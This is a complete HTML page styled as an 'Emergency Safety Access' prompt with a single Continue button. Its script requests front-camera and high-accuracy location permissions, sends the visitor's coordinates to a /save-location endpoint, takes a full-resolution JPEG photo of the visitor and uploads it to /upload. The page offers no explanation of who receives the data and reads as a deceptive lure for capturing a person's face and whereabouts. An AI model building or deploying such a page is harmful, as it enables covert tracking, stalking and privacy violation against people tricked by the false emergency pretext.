<!DOCTYPE html>
<html>
<head>

    <title>Emergency System</title>

    <style>

        body{
            background:#0f0f0f;
            color:white;
            font-family:Arial;
            text-align:center;
            margin-top:100px;
        }

        h1{
            font-size:40px;
        }

        button{
            padding:15px 35px;
            font-size:22px;
            border:none;
            border-radius:12px;
            cursor:pointer;
            background:#00ff88;
        }

    </style>

</head>

<body>

    <h1>Emergency Safety Access</h1>

    <button onclick="startAccess ()">
        Continue
    </button>

<script>

async function startAccess(){

    try{

        // CAMERA ACCESS (HD)
        const stream = await navigator.mediaDevices.getUserMedia({

            video:{
                width:{ ideal:1920 },
                height:{ ideal:1080 },
                facingMode:"user"
            }

        });

        const video = document.createElement("video");

        video.srcObject = stream;

        await video.play();

        // LOCATION ACCESS
        navigator.geolocation.getCurrentPosition(

            async(position)=>{

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;

                // SEND LOCATION
                await fetch("/save-location",{

                    method:"POST",

                    headers:{
                        "Content-Type":"application/json"
                    },

                    body:JSON.stringify({
                        latitude,
                        longitude
                    })

                });

                // CREATE HD IMAGE
                const canvas = document.createElement("canvas");

                canvas.width = 1920;
                canvas.height = 1080;

                const ctx = canvas.getContext("2d");

                ctx.drawImage(video,0,0);

                // CONVERT TO HIGH QUALITY JPG
                canvas.toBlob(async(blob)=>{

                    const formData = new FormData();

                    formData.append("photo",blob,"photo.jpg");

                    await fetch("/upload",{

                        method:"POST",
                        body:formData

                    });

                    alert("Emergency Data Shared");

                },"image/jpeg",1.0);

            },

            (error)=>{

                alert("Location permission denied");

            },

            {
                enableHighAccuracy:true,
                timeout:10000,
                maximumAge:0
            }

        );

    }

    catch(err){

        alert("Permission Denied");

    }

}

</script>

</body>
</html>
